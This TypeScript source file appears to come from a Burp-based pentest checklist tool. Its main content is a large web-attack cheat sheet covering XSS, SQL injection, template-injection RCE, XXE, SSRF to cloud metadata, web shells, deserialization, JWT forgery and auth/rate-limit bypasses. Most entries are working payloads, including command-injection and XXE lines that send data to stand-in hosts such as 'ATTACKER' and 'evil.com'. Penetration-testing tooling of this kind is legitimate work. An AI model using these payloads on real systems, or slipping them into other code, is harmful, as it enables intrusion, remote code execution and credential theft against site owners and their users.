/**
 * CheatSheet — curated "god-level" offensive-security knowledge base used by
 * the Burp Bridge checklist generator.
 *
 * Every category carries concrete payloads AND bypass chains. When a tester
 * marks a checklist item "failed", the AI bypass suggestion is grounded in
 * these chains plus the actual captured request/response.
 */

export type CheatCategory =
  | 'xss' | 'sqli' | 'ssti' | 'xxe' | 'ssrf' | 'idor' | 'auth' | 'jwt'
  | 'file-upload' | 'command-injection' | 'path-traversal' | 'deserialization'
  | 'api' | 'graphql' | 'cors-csrf' | 'open-redirect' | 'info-disclosure'
  | 'headers' | 'rate-limit' | 'recon';

export interface CheatItem {
  technique: string;
  description: string;
  payloads: string[];
  /** Filter-evasion / escalation chains to try when the base attempt fails. */
  bypass: string[];
}

export interface CheatCategoryDef {
  label: string;
  icon: string;
  items: CheatItem[];
}

export const CHEATSHEET: Record<CheatCategory, CheatCategoryDef> = {
  xss: {
    label: 'Cross-Site Scripting', icon: '🧨',
    items: [
      {
        technique: 'Reflected / stored XSS probe',
        description: 'Inject HTML/JS into every reflected input and stored field; verify with a non-destructive payload first, then confirm with an alert/image-load equivalent.',
        payloads: [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '"><svg/onload=alert(1)>',
          "';alert(1);//",
          '<iframe srcdoc="<script>alert(1)</script>">',
        ],
        bypass: [
          'Context-aware: HTML tag context → break attributes with " onfocus=alert(1) autofocus x="; JS string context → \'</script><script>alert(1)</script> or \\x27+alert(1)+\\x27.',
          'Encoding game: <scr<script>ipt>, &#x3c;script&#x3e;, %3cscript%3e (URL), \\u003c (JS), `&#96;`, nested entities — test each input handling stage.',
          'Case + whitespace evasion: <ScRiPt>, <img/src=x/onerror=alert(1)>, tab/newline inside tags, null byte %00.',
          'WAF busting: use // for comments, `(alert)(1)`, top["al"+"ert"](1), `eval(atob(\'YWxlcnQoMSk=\'))`, JSFuck for extreme filters.',
          'Mutation XSS (mXSS): innerHTML sinks like <noscript><p title="</noscript><img src=x onerror=alert(1)>".',
          'DOM sinks: location.hash, document.write, innerHTML, eval — check client-side JS for source→sink flows even when server reflects nothing.',
          'Polyglot payload that survives HTML, URL, JSON, and JS decoding: "><img src=x onerror=alert(1)>" — plus UTF-7 (&#43;ADw-script&#43;ADE-) on legacy pages.',
        ],
      },
      {
        technique: 'DOM-based XSS hunt',
        description: 'Audit client-side JS for untrusted data flowing into dangerous sinks (innerHTML, document.write, eval, location assignment, postMessage).',
        payloads: [
          '#"><img src=x onerror=alert(document.domain)>',
          'javascript:alert(1)//',
          '?__proto__[x]=<img/src/onerror=alert(1)>',
          'postMessage({type:"x",html:"<img src=x onerror=alert(1)>"})',
        ],
        bypass: [
          'Source→sink mapping: location.hash → innerHTML is the classic; also document.referrer, window.name, postMessage origin checks.',
          'If the sink sanitises once, double-encode or use a nested sink (e.g. URL parser normalises then innerHTML re-parses).',
          'Clobbering: <form id=x><input name=innerHTML value="<img src=x onerror=alert(1)>"> makes x.innerHTML hit the form element.',
        ],
      },
    ],
  },

  sqli: {
    label: 'SQL Injection', icon: '💉',
    items: [
      {
        technique: 'SQLi detection & error-based extraction',
        description: 'Probe every parameter that reaches the DB (search, sort, id, filters) with classic and WAF-resilient primitives.',
        payloads: [
          "'", '"', '`', '\\',
          "' OR '1'='1",
          "' OR 1=1-- -",
          "' UNION SELECT NULL,NULL,NULL-- -",
          "1' AND SLEEP(5)-- -",
          "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
          "'; WAITFOR DELAY '0:0:5'--",
        ],
        bypass: [
          'Comment/syntax variety: -- -, --+, #, /*!50000UNION*/, ;%00, /**/, /*! ... */ inline comments.',
          'No-space tricks: OR/**/1=1, OR(1=1), %0aOR%0a1=1, +OR+1=1, tab/newline separators.',
          'Case mixing: uNiOn sElEcT, and also whitespace-free alternatives like ||, && (MySQL), (1)OR(1).',
          'Encoding: URL double-encode %2527, unicode %u0027 (IIS), hex 0x27, CHAR(39) concatenation, CONCAT/|| string builders.',
          'WAF evasions: rewrite filters with comments in keywords (SEL/**/ECT), no-quote numbers (1,2,3), boolean blind with arithmetic (1-0, 2-1), LIKE instead of =.',
          'If UNION column count is filtered, use ORDER BY n probing and negative/positive errors; blind via AND/OR with binary search on ASCII.',
          'Time-based: MySQL SLEEP/BENCHMARK, PG pg_sleep, MSSQL WAITFOR, Oracle DBMS_LOCK.SLEEP, SQLite randomblob(1e9).',
        ],
      },
      {
        technique: 'Blind / boolean-based SQLi',
        description: 'When no error is returned, infer data via true/false response differences.',
        payloads: [
          "' AND '1'='1",
          "' AND '1'='2",
          "' AND SUBSTRING((SELECT version()),1,1)='5'-- -",
          "1 AND (SELECT COUNT(*) FROM users)>0",
        ],
        bypass: [
          'If the app strips the word AND/OR, double it (AANDND) or use && / || with URL encoding, or bitwise ops (&, |, ^).',
          'CASE WHEN … THEN 1 ELSE 0 END replaces boolean keywords entirely.',
          'Extraction via comparisons on LIMIT/OFFSET and pagination deltas when no visible output exists.',
        ],
      },
    ],
  },

  ssti: {
    label: 'Server-Side Template Injection', icon: '🪄',
    items: [
      {
        technique: 'SSTI detection & RCE',
        description: 'Any template that renders user input (email templates, error pages, name fields) may evaluate expressions. Detect with arithmetic, then escalate per engine.',
        payloads: [
          '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
          '{{7*\'7\'}}',  // distinguishes engines
          '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
          '${T(java.lang.Runtime).getRuntime().exec(\'id\')}',
          '#set($x=$rt.getClass().forName("java.lang.Runtime"))',
        ],
        bypass: [
          'Engine fingerprint: {{7*7}} vs ${7*7} vs <%- 7*7 %>; Twig/Jinja2 accept {{}}, Freemarker ${}, Velocity #set, ERB <%%>.',
          'Jinja2: {{config}} leaks app config; chain to RCE via __class__.__mro__[1].__subclasses__() index hunting; filter bypass with attribute access via |attr(), request.args trick.',
          'Sandbox escape: look for os, subprocess, eval, __import__ in globals; if blocked, walk __subclasses__ for warnings.catch_warnings or os._wrap_close.',
          'Twig: {{_self.env.registerUndefinedFilterCallback("system")}}; Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}.',
          'When RCE is blocked, still extract config/secrets/DB creds from environment or template globals.',
        ],
      },
    ],
  },

  xxe: {
    label: 'XXE / XML Injection', icon: '📄',
    items: [
      {
        technique: 'Classic XXE file read',
        description: 'XML endpoints (SOAP, API bodies, uploads, SVG) may resolve external entities.',
        payloads: [
          '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
          '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///C:/Windows/win.ini">]><x>&e;</x>',
          '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % e SYSTEM "http://ATTACKER/xxe.dtd">%e;]><x>&data;</x>',
        ],
        bypass: [
          'Blind XXE: exfil via OOB DTD (parameter entities) to attacker-controlled server; use ftp:// or http:// URLs.',
          'If file:// is blocked, try php://filter/read=convert.base64-encode/resource= (PHP), jar: protocol, expect://, netdoc:// (Java).',
          'Error-based blind XXE: force a parse error that echoes entity content (DTD with a missing sub-entity referencing the file).',
          'SVG upload XXE → SSRF: <svg xmlns=...><image href="file:///etc/passwd"/></svg> or fetch internal URLs via xlink:href.',
          'XXE → SSRF: entity pointing at http://169.254.169.254/latest/meta-data/ (cloud metadata) or internal services.',
          'Bypass disabled external entities: use parameter entities in internal DTD subset — many parsers block general entities but allow % entities in the internal subset.',
        ],
      },
    ],
  },

  ssrf: {
    label: 'Server-Side Request Forgery', icon: '🌐',
    items: [
      {
        technique: 'SSRF via URL parameters',
        description: 'Any server-side fetch (webhooks, image proxies, PDF generators, URL previews, file imports) is an SSRF candidate.',
        payloads: [
          'http://127.0.0.1/',
          'http://localhost/',
          'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          'http://[::1]/',
          'http://0.0.0.0/',
          'file:///etc/passwd',
          'gopher://127.0.0.1:6379/_INFO%0d%0a',
        ],
        bypass: [
          'DNS tricks: localhost.anything, 127.0.0.1.nip.io, 2130706433 (decimal), 0x7f000001 (hex), 0177.0.0.1 (octal), http://127.1/, http://0/, IPv6 [::ffff:127.0.0.1].',
          'Redirect chains: SSRF the app to a URL that 302s to 127.0.0.1 (open redirect on attacker domain, or httpbin/redirect).',
          'URL parser differentials: http://127.0.0.1@evil.com (userinfo), http://evil.com#@127.0.0.1, http://127.0.0.1%252f@evil.com, whitespace/%00 truncation, backslash hosts http://127.0.0.1\\@evil.com.',
          'Protocol escalation: gopher:// for raw TCP (Redis, SMTP, internal services), dict://, ldap://, file://.',
          'Cloud metadata: AWS 169.254.169.254, GCP metadata.google.internal, Azure 169.254.169.254/IMDS; add headers X-Forwarded-Host / Metadata:true for IMDSv2.',
          'If a host blocklist exists, use DNS rebinding (rbndr.us / 1u.ms style) or a wildcard DNS service to pass validation then resolve to internal IP.',
        ],
      },
    ],
  },

  idor: {
    label: 'IDOR / Broken Object Access', icon: '🔑',
    items: [
      {
        technique: 'IDOR enumeration & escalation',
        description: 'Replace object IDs in URLs, bodies, and headers to test vertical/horizontal privilege boundaries.',
        payloads: [
          'GET /api/users/1 → /api/users/2, /api/users/0, /api/users/-1',
          'POST /api/orders {"id": 12345}',
          'PATCH /api/profile {"userId":"<victim>"}',
          'X-Original-URL / X-Rewrite-URL tampering',
          'GET /api/user/me → swap to /api/user/<uuid-of-other>',
        ],
        bypass: [
          'ID formats: sequential ints, UUIDs (leaked via responses/emails), base64-encoded ids (decode! base64(123) → MTIz — swap and re-encode), hashes (test 1, 2, 3).',
          'Mass assignment: add extra fields (role, admin, isAdmin:true, plan:premium) to update requests — server may accept unknown fields.',
          'HTTP method override: X-HTTP-Method-Override: DELETE, PUT /resource vs PATCH — different authz paths.',
          'GraphQL aliases can bypass object-level checks when field-level authz is missing.',
          'Batch endpoints: /api/users?ids=1,2,3 or arrays in POST body bypass per-object checks.',
          'Unicode/case hostnames, trailing slashes, %2e%2e, and duplicate parameters (?id=1&id=2) can confuse routing to a different handler.',
        ],
      },
    ],
  },

  auth: {
    label: 'Authentication Bypass', icon: '🛂',
    items: [
      {
        technique: 'Login & session flaws',
        description: 'Default creds, verbose errors, missing rate limiting, password reset flaws, and OAuth misconfigurations.',
        payloads: [
          'admin/admin, admin/password, root/root, test/test',
          'POST /api/login {"username":"admin","password":"*"} — username enumeration via timing/error',
          'Password reset token prediction / Host header injection in reset links',
          'OAuth: state parameter missing, redirect_uri open redirect, token in URL leak',
        ],
        bypass: [
          'Response differentials: "unknown user" vs "wrong password" → enumerate usernames, then spray.',
          'Rate-limit bypass: X-Forwarded-For / X-Real-IP spoofing, append . / whitespace to username, null byte, case changes, IPv6, rotate session cookies.',
          'Reset flow: race condition on reset tokens (parallel requests), token in referrer/logs, integer token increment, predictable HMAC, Host header poisoning to attacker domain.',
          '2FA bypass: response manipulation (drop 2fa flag), reuse old session, OTP in response body, race condition, backup codes brute force.',
          'Remember-me / persistent cookie: decrypt/inspect for signed data, tamper with unsigned fields.',
          'OAuth: swap code for token with altered redirect_uri, exchange authorization_code for different client (client_id confusion), test missing state → CSRF account linking.',
        ],
      },
    ],
  },

  jwt: {
    label: 'JWT Attacks', icon: '🎫',
    items: [
      {
        technique: 'JWT manipulation',
        description: 'Inspect every JWT in scope — algorithm confusion, weak secrets, and header injection are common.',
        payloads: [
          '{"alg":"none","typ":"JWT"} — header + base64(alg:none)',
          '{"alg":"HS256"} signed with the RSA public key (confusion attack)',
          'kid: "../../../dev/null" or kid with attacker-controlled key file',
          'Weak secret crack: jwt_tool / hashcat with rockyou',
          'jku/x5u header → attacker-hosted JWKS',
        ],
        bypass: [
          'alg:none — strip signature, keep header {"alg":"none"}; some libs accept None, NONE, nOnE.',
          'HS256/RS256 confusion: if the server verifies with the RSA public key, sign HS256 tokens with that key material (public key → HMAC secret).',
          'kid injection: point kid to a file whose content you control (e.g. SQLi, file upload, /dev/null, or a path traversal into a known file).',
          'jku/jwk header: set jku to your hosted JWKS and craft a matching key — works when the library doesn\'t pin the issuer.',
          'Expired token reuse: if exp/nbf validation is off (or iat confusion), replay old tokens; try unsigned tokens and empty signatures.',
          'Algorithm whitelist bypass: send "alg":"HS512" or unexpected algs the lib defaults to symmetric.',
        ],
      },
    ],
  },

  'file-upload': {
    label: 'File Upload Abuse', icon: '📤',
    items: [
      {
        technique: 'Malicious file upload → RCE / stored XSS',
        description: 'Webshells, polyglots, extension bypasses, and content-type confusion on every upload endpoint.',
        payloads: [
          'shell.php / shell.php5 / shell.phtml / shell.php.jpg',
          '<?php system($_GET[\'c\']); ?>',
          '<script>alert(1)</script> in .svg / .html upload',
          'Polyglot: GIF89a;<?php system($_GET[c]);?> (magic-byte GIF)',
          'double extension: file.php.jpg, file.jpg.php, file.php%00.jpg',
        ],
        bypass: [
          'Extension filters: try .php5/.phtml/.phar/.php7/.shtml/.asp/.aspx/.jsp/.jspx/.war/.cgi, case (pHp), trailing dots/spaces (php. → trimmed), double extensions, null byte (classic, rarely works now), unicode (php%c0%ae).',
          'Content-type/magic-byte checks: prepend GIF89a or PNG magic, or use image polyglot shells; test if content sniffing is disabled (X-Content-Type-Options).',
          'Filename filters: upload valid image, rename server-side to .php via path traversal in filename (../../shell.php) or race conditions.',
          'Stored XSS: upload .svg with <script>, .html, or crafted .xml; XSS via filename reflected in page ("><img src=x onerror=alert(1)>.png).',
          'After upload, locate the file: check /uploads/<hash>, /static, /files, response JSON location field, or path traversal in GET.',
          'ImageMagick RCE (ImageTragick): mvg/mvg profiles, "push graphic-context" payloads on old versions.',
        ],
      },
    ],
  },

  'command-injection': {
    label: 'Command Injection', icon: '⌨️',
    items: [
      {
        technique: 'OS command injection',
        description: 'Parameters that feed shell commands (ping, traceroute, zip, ffmpeg, grep, mail, cron) are prime targets.',
        payloads: [
          '; id', '| id', '|| id', '&& id', '`id`', '$(id)',
          'ping 127.0.0.1; curl ATTACKER/$(whoami)',
          '1;cat /etc/passwd#',
          '" && whoami && "',
        ],
        bypass: [
          'Filtered separators: newline %0a, carriage return %0d, tab, {id;} (bash brace), $IFS as space (cat$IFS/etc/passwd), ${IFS} variants.',
          'Char-less execution: printf \'id\'|sh, $(<file) (bash reads file as command), /bin/cat${IFS}/etc/passwd, sh -c via $0.',
          'Quotes/apostrophe filters: $"id", $\'id\', concatenation c""at, c\'a\'t — shell globbing c?t / c[a]t.',
          "Base64/hex encoding of the whole command: echo YmluL2Jhc2g=|base64 -d|bash, $'\\x2fbin\\x2fsh'.",
          'Blind injection: use time delay (sleep 5), DNS/HTTP OOB (curl ATTACKER/$(whoami), nslookup `whoami`.evil.com), or write output to a web-accessible file.',
        ],
      },
    ],
  },

  'path-traversal': {
    label: 'Path Traversal / LFI', icon: '🗂️',
    items: [
      {
        technique: 'Directory traversal & local file inclusion',
        description: 'File-name parameters (download, include, template, language, log) can read arbitrary files.',
        payloads: [
          '../../../../etc/passwd',
          '..\\..\\..\\windows\\win.ini',
          '%2e%2e%2f%2e%2e%2fetc/passwd',
          '....//....//etc/passwd',
          '/etc/passwd%00.png',
        ],
        bypass: [
          'Encoding soup: %2e%2e%2f, %252e%252e%252f (double), %c0%ae%c0%ae (overlong UTF-8), .%2e/, %2e./, ..%5c (backslash), unicode %u2216.',
          'Filter strippers: if ".." or "/" is removed, send ....// (removal leaves ../), ..;/ (semicolon), ..././, nested ..%2f..%2f.',
          'Absolute paths when relative blocked: /etc/passwd, C:\\windows\\win.ini — sometimes the filter only blocks "..".',
          'LFI→RCE: /proc/self/environ with User-Agent PHP code, /proc/self/fd/<?php shell, php://filter wrapper, log poisoning (access.log + UA), /var/log/auth.log SSH injection.',
          'Windows: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts, 8.3 short names, ADS streams (file.txt:secret).',
        ],
      },
    ],
  },

  deserialization: {
    label: 'Insecure Deserialization', icon: '🧊',
    items: [
      {
        technique: 'Deserialization gadget hunting',
        description: 'Cookies/session data or API bodies that are base64-encoded serialised objects are often exploitable for RCE.',
        payloads: [
          'PHP: O:8:"stdClass":0:{} — probe php unserialize via cookie (s:4:"name";)',
          'Java: ACFu... base64 of serialised object; test with ysoserial gadget chains',
          'Python pickle: c__builtin__\neval\n(S\'__import__("os").system("id")\'\ntR.',
          'Ruby: Marshal.load — Gem::Installer / Gem::SpecFetcher gadgets',
          '.NET: BinaryFormatter / JSON.NET TypeNameHandling.All',
        ],
        bypass: [
          'Fingerprint: base64-decode the value — PHP serialised data starts with a: or O:, Java with AC ED 00 05 (or rO0AB), .NET base64 has NUL-laden binary.',
          'PHP: object injection via __wakeup/__destruct magic methods; POP chains in the application\'s own classes; phar:// deserialization via file functions.',
          'Java: identify libs on classpath (gadget collector), then ysoserial chains (CommonsCollections, Groovy, Spring, JDK-only).',
          'When RCE fails, deserialization can still yield SSRF (URLStreamHandler gadgets) or file read (TemplatesImpl variants).',
        ],
      },
    ],
  },

  api: {
    label: 'API Abuse', icon: '🔌',
    items: [
      {
        technique: 'API enumeration & abuse',
        description: 'REST/JSON APIs need schema discovery, method fuzzing, and authz testing beyond the documented surface.',
        payloads: [
          'OPTIONS /api/resource — expose allowed methods',
          'GET /api/swagger.json, /api/docs, /openapi.json, /v2/api-docs',
          'PATCH /api/user {"role":"admin"} — mass assignment',
          'DELETE /api/orders/123 with victim\'s token (BOLA)',
          'POST /api/v1/export?url=http://169.254.169.254/ (SSRF via API)',
        ],
        bypass: [
          'Version skimming: /api/v2/… when v1 is patched, /api/internal, /api/admin, /internal/v1 — old versions often lag authz.',
          'Method confusion: GET vs POST vs PUT vs PATCH on the same route hit different handlers with different checks.',
          'Content-type confusion: send form-encoded where JSON is expected and vice versa; add duplicate keys; send arrays (id[]=1) where scalars expected.',
          'Param pollution: ?id=1&id=2, ?user=me&user=victim — last/first wins depends on framework.',
          'Pagination/lists: abuse ?limit=-1, ?page=0, sort fields, include=* — force the API to dump more than intended.',
          'Unused/undocumented endpoints: fuzz common names (users, admin, debug, test, backup, config, internal) with a small wordlist per path segment.',
        ],
      },
    ],
  },

  graphql: {
    label: 'GraphQL Abuse', icon: '🕸️',
    items: [
      {
        technique: 'GraphQL introspection & abuse',
        description: 'Introspection exposes the whole schema; queries may bypass REST authz.',
        payloads: [
          'query{__schema{types{name fields{name args{name type{name}}}}}}',
          'query{__typename}',
          '{users{id email password}} — field brute force',
          'mutation{__typename}',
          '{"query":"{user(id:1){id email}}","variables":{}}',
        ],
        bypass: [
          'Introspection disabled: try __schema, __type with obfuscation (spaces, aliases: a:__typename), or disable-vendors-era tricks — then wordlist field names (id, email, password, secret, token, creditCard).',
          'Authz: query objects by id even when you shouldn\'t (BOLA); batch with aliases to evade rate limits: {a:user(id:1){email} b:user(id:2){email} ...}.',
          'Persisted queries: if enabled, find query ids in traffic and reuse them without introspection.',
          'GET-based queries leak sensitive data into logs/referrer; mutations over GET may be allowed.',
          'Depth/complexity limits bypass: alias-bombing and field duplication to cause DoS, or find expensive fields (connections with huge first:).',
        ],
      },
    ],
  },

  'cors-csrf': {
    label: 'CORS & CSRF', icon: '🛡️',
    items: [
      {
        technique: 'CORS misconfiguration & CSRF',
        description: 'Reflect the Origin header and test preflights; state-changing requests without tokens are CSRF targets.',
        payloads: [
          'Origin: https://evil.com → check Access-Control-Allow-Origin reflection',
          'Origin: null (sandboxed iframe / data: URL)',
          'Origin: https://victim.com.evil.com (subdomain confusion)',
          'CSRF: <form action="https://target/api/change-email" method="POST"> with autosubmit JS',
        ],
        bypass: [
          'Origin reflection on subdomains: test every registered subdomain (often a forgotten dev subdomain is attacker-influenceable via subdomain takeover).',
          'null origin: sandboxed iframes, data: URLs, file:// — if ACAO:null + credentials is returned, that\'s exploitable from any null-origin context.',
          'CORS + XSS combo: if you find XSS anywhere on the origin, CORS with credentials turns it into full API compromise.',
          'CSRF when SameSite=Lax: use top-level GET navigation, or subdomain XSS to bypass SameSite entirely.',
          'CSRF token bypass: token not validated on certain content types, token tied to session but reusable, missing token on PATCH/DELETE, anti-CSRF only on form posts.',
          'Double-submit cookie: if the server just compares cookie vs body token, an attacker can set the cookie via subdomain (cookie tossing).',
        ],
      },
    ],
  },

  'open-redirect': {
    label: 'Open Redirect', icon: '↩️',
    items: [
      {
        technique: 'Open redirect detection',
        description: 'Redirect parameters, callback URLs, and login flows often trust user input for the destination.',
        payloads: [
          '?next=https://evil.com', '?redirect=/login?redirect=//evil.com',
          '?url=//evil.com', '?return=https://evil.com%2f..',
          '?r=javascript:alert(1) — XSS via redirect param',
        ],
        bypass: [
          'Protocol-relative //evil.com bypasses http(s) filters; backslashes https://target.com\\@evil.com; whitespace/control chars; double-encoding.',
          'Open redirects turn into: OAuth token theft (redirect_uri), password reset poisoning, CSRF chains, and phishing.',
          'If only specific domains allowed, test subdomains of allowed domain and userinfo tricks (https://allowed.com@evil.com).',
        ],
      },
    ],
  },

  'info-disclosure': {
    label: 'Information Disclosure', icon: '🔍',
    items: [
      {
        technique: 'Exposed files & verbose errors',
        description: 'Backup files, source control, debug endpoints, and error verbosity leak credentials and internals.',
        payloads: [
          '/.git/config, /.git/HEAD',
          '/.env, /config.php.bak, /backup.zip, /db.sql, /wp-config.php~',
          '/actuator/env, /actuator/health (Spring Boot)',
          '/server-status, /server-info (Apache), /phpinfo.php',
          'Trigger 500s and read stack traces for paths/libs/versions',
        ],
        bypass: [
          'Dotfile/backup patterns: file.php.swp, file.php~, .file.php.bak, file.php.old, file.php.save, file.php.txt, file.php%00, file.php::$DATA (NTFS ADS).',
          '.git dump: if /.git/config readable, dump the whole repo with git-dumper and hunt credentials in history.',
          'Spring Boot actuator: /actuator/env (secrets), /actuator/heapdump (heap → keys), /actuator/gateway/routes (SSRF), /actuator/restart (RCE via classpath).',
          'Cloud metadata + debug: /server-status, mod_status; verbose PHP errors with display_errors=On leak file paths and SQL queries.',
          'Error messages: try malformed JSON, oversized inputs, type confusion — each framework leaks different internals (Python tracebacks, .NET yellow screens, Java stack traces).',
        ],
      },
    ],
  },

  headers: {
    label: 'Security Headers & TLS', icon: '🪪',
    items: [
      {
        technique: 'Missing security headers / weak TLS',
        description: 'Response header inventory and TLS configuration review for the whole host surface.',
        payloads: [
          'Check for: Strict-Transport-Security, Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy',
          'Cookies must have Secure + HttpOnly + SameSite',
          'TLS: test for TLS1.0/1.1, weak ciphers, missing cert chain, HSTS preload',
        ],
        bypass: [
          'Even with CSP present, test for: unsafe-inline/unsafe-eval, missing object-src/base-uri (CSP bypass via <base> or <object>), JSONP endpoints, Angular template injection.',
          'Clickjacking when X-Frame-Options/CSP frame-ancestors missing — combine with a CSRF for full impact.',
          'Cache headers: sensitive responses cached (Cache-Control missing) → check shared caches and browser history; test Authorization header caching.',
        ],
      },
    ],
  },

  'rate-limit': {
    label: 'Rate Limiting & Brute Force', icon: '⏱️',
    items: [
      {
        technique: 'Rate-limit bypass & credential stuffing',
        description: 'Login, OTP, and API-key endpoints without effective throttling allow brute force.',
        payloads: [
          'X-Forwarded-For: 1.2.3.4 rotation per request',
          'X-Real-IP / X-Originating-IP / CF-Connecting-IP spoofing',
          'Append dots/spaces/case to username: admin., admin%20, Admin',
          'Null byte / newline in username: admin%00',
        ],
        bypass: [
          'Header rotation: X-Forwarded-For, X-Real-IP, X-Client-IP, True-Client-IP, CF-Connecting-IP, X-Originating-IP, X-Forwarded-Host.',
          'Parameter-based: rotate ?id=1&id=2, add random params, use different Content-Types, HTTP/1.1 vs HTTP/2, IPv6 addresses.',
          'Timing: spread across long windows if the limit resets; use slow-loris style pacing under the threshold.',
          'OTP endpoints: 4-digit OTPs = 10k space, often no lockout — race or brute within the validity window.',
          'If lockout exists: lock out the victim (DoS) or find a secondary endpoint that resets the counter (e.g. failed-count reset on password change).',
        ],
      },
    ],
  },

  recon: {
    label: 'Recon & Tech Fingerprinting', icon: '🧭',
    items: [
      {
        technique: 'Passive & active recon from traffic',
        description: 'Build the attack surface from captured traffic: endpoints, tech stack, JS assets, and leaked internals.',
        payloads: [
          'Server headers: Server, X-Powered-By, Via, X-AspNet-Version',
          'JS asset hunt: /static/app.js, bundle.js, main.[hash].js — grep for endpoints, API keys, internal URLs',
          'Cookie names reveal stack: JSESSIONID (Java), PHPSESSID (PHP), ASP.NET_SessionId, connect.sid (Node), session (Rails)',
          '404 pages & error responses reveal framework and version',
        ],
        bypass: [
          'JavaScript secret mining: search JS for apiKey, secret, token, aws, firebase, s3.amazonaws, internal domains, and full API paths — then hit those endpoints.',
          'Source maps: if .map files ship, download and reconstruct original source for endpoint/secret hunting.',
          'Robots/sitemap/security.txt and old versions of endpoints in JS bundles often reveal deprecated APIs with weaker authz.',
        ],
      },
    ],
  },
};

export const CATEGORY_ORDER: CheatCategory[] = [
  'xss', 'sqli', 'ssti', 'xxe', 'ssrf', 'idor', 'auth', 'jwt',
  'file-upload', 'command-injection', 'path-traversal', 'deserialization',
  'api', 'graphql', 'cors-csrf', 'open-redirect', 'info-disclosure',
  'headers', 'rate-limit', 'recon',
];

/** Human label for a category. */
export function categoryLabel(cat: string): string {
  return CHEATSHEET[cat as CheatCategory]?.label || cat.replace(/-/g, ' ');
}

/** All cheatsheet items flattened. */
export function allCheatItems(): { category: CheatCategory; item: CheatItem }[] {
  const out: { category: CheatCategory; item: CheatItem }[] = [];
  for (const cat of CATEGORY_ORDER) {
    for (const item of CHEATSHEET[cat].items) out.push({ category: cat, item });
  }
  return out;
}

/** Bypass chains for a category (used by the demo bypass fallback). */
export function bypassChainsFor(cat: string): string[] {
  const def = CHEATSHEET[cat as CheatCategory];
  if (!def) return [];
  const chains: string[] = [];
  for (const item of def.items) for (const b of item.bypass) chains.push(b);
  return chains;
}

/**
 * Detect which categories are relevant given an endpoint inventory.
 * Rules: POST/query params → injection classes; auth-ish paths → auth/jwt;
 * upload paths → file-upload; graphql path → graphql; JS assets → xss/recon;
 * api-looking paths → api/idor; plus a base set always worth sweeping.
 */
export function detectCategories(endpoints: Array<{
  method: string; path: string; isJsAsset?: boolean; contentType?: string;
}>, extra: { hasFindings?: boolean } = {}): CheatCategory[] {
  const cats = new Set<CheatCategory>(['recon', 'headers', 'info-disclosure']);
  let hasQuery = false, hasPost = false, hasAuth = false, hasUpload = false;
  for (const ep of endpoints) {
    const p = ep.path.toLowerCase();
    if (ep.method === 'POST' || ep.method === 'PUT' || ep.method === 'PATCH') hasPost = true;
    if (p.includes('?') || /(search|filter|q|id|page|sort|query|name|email|url|redirect|file|path|download|callback|next|return|user|account)/.test(p)) hasQuery = true;
    if (/(login|signin|signup|auth|token|session|oauth|password|reset|register|otp|2fa)/.test(p)) hasAuth = true;
    if (/(upload|import|attach|image|avatar|file|media|document|dropzone)/.test(p)) hasUpload = true;
    if (/graphql/i.test(p)) cats.add('graphql');
    if (/\.(js|mjs)$/.test(p) || ep.isJsAsset) { cats.add('xss'); cats.add('recon'); }
    if (/api\//.test(p)) { cats.add('api'); cats.add('idor'); }
    if (/(export|webhook|proxy|fetch|preview|render|image|resize|thumbnail|redirect)/.test(p)) cats.add('ssrf');
    if (/\.(php|asp|aspx|jsp)$/.test(p)) cats.add('info-disclosure');
  }
  if (hasQuery) { cats.add('sqli'); cats.add('xss'); cats.add('ssti'); cats.add('path-traversal'); cats.add('open-redirect'); cats.add('command-injection'); }
  if (hasPost) { cats.add('api'); cats.add('cors-csrf'); cats.add('deserialization'); cats.add('xxe'); }
  if (hasAuth) { cats.add('auth'); cats.add('jwt'); cats.add('rate-limit'); }
  if (hasUpload) cats.add('file-upload');
  if (extra.hasFindings) { cats.add('api'); cats.add('idor'); }
  // Always-relevant sweep
  cats.add('cors-csrf');
  return CATEGORY_ORDER.filter(c => cats.has(c));
}

/** Evidence about an endpoint derived from ACTUAL captured traffic. */
export interface EndpointEvidence {
  method: string;
  host: string;
  path: string;       // normalized
  isJsAsset: boolean;
  /** Any captured request to this endpoint had a query string. */
  hasQuery: boolean;
  /** Any captured request to this endpoint had a request body. */
  hasBody: boolean;
  /** Most common response content type for this endpoint. */
  contentType: string;
}

/**
 * CONTEXT-AWARE category detection — only techniques the traffic actually
 * supports get proposed. No generic sweeps: an endpoint with no parameters
 * does not get SQLi/XSS probes, and no global "recon / missing headers / .git"
 * bucket is ever added — those are auto-confirmed from responses instead.
 */
export function endpointCheatCategories(ep: EndpointEvidence): CheatCategory[] {
  const cats = new Set<CheatCategory>();
  const p = ep.path.toLowerCase();
  const m = ep.method.toUpperCase();
  const ct = (ep.contentType || '').toLowerCase();
  const hasParams = ep.hasQuery || ep.hasBody;

  // JS assets → client-side XSS + secret-hunt on THIS asset only.
  if (ep.isJsAsset || /\.(js|mjs)$/.test(p)) { cats.add('xss'); cats.add('recon'); }

  // Parametrised endpoints → injection classes.
  if (hasParams) {
    cats.add('sqli');
    cats.add('xss');
    cats.add('command-injection');
    if (/(url|redirect|export|webhook|proxy|fetch|preview|render|resize|thumbnail|callback|next|return|download|path|file|import)/.test(p)) {
      cats.add('ssrf');
    }
  }

  // Auth surface.
  if (/(login|signin|signup|auth|token|session|oauth|password|reset|register|otp|2fa|verify|activate|account)/.test(p)) {
    cats.add('auth'); cats.add('jwt'); cats.add('rate-limit');
  }

  // Upload surface (only when there's actually a body or POST).
  if (/(upload|import|attach|avatar|image|file|media|document|dropzone)/.test(p) && (ep.hasBody || m === 'POST')) {
    cats.add('file-upload');
  }

  // GraphQL.
  if (/graphql/i.test(p)) cats.add('graphql');

  // API surface.
  if (/\/api\//.test(p)) {
    cats.add('api');
    // IDOR strongly evidenced by :id / :token segments or query params.
    if (p.includes(':id') || p.includes(':token') || ep.hasQuery) cats.add('idor');
  }

